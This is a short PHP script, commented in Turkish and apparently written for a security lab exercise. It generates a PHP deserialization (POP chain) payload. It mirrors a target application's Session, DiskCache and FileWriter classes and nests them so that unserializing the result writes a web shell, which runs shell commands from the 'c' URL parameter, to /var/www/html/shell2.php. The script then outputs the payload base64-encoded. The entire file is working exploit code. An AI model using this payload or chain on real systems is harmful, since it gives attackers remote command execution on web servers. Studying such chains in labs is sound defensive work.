<?php
/**
 * Lab 2 POP CHAIN payload uretici.
 *
 * Hedef uygulamadaki siniflarla AYNI isim ve property'leri tanimliyoruz.
 * Sonra objeleri IC ICE baglayip (store->backend) serialize ediyoruz.
 */

// Hedefteki siniflarin ayni isimlisi (property'ler birebir eslesmeli)
class Session   { public $user = 'guest'; public $store = null; }
class DiskCache { public $backend = null; }
class FileWriter{ public $filename = '/tmp/out.log'; public $content = ''; }

// --- SINK'i hazirla: webshell'i nereye, ne yazacagiz ---
$fw = new FileWriter();
$fw->filename = '/var/www/html/shell2.php';
$fw->content  = '<?php system($_GET["c"]); ?>';

// --- ARA HALKA: DiskCache'in backend'i = FileWriter ---
$dc = new DiskCache();
$dc->backend = $fw;

// --- GIRIS: Session'in store'u = DiskCache ---
$s = new Session();
$s->store = $dc;          // iste zincir burada kuruluyor

// Ic ice objeyi serialize + base64
echo base64_encode(serialize($s)), "\n";
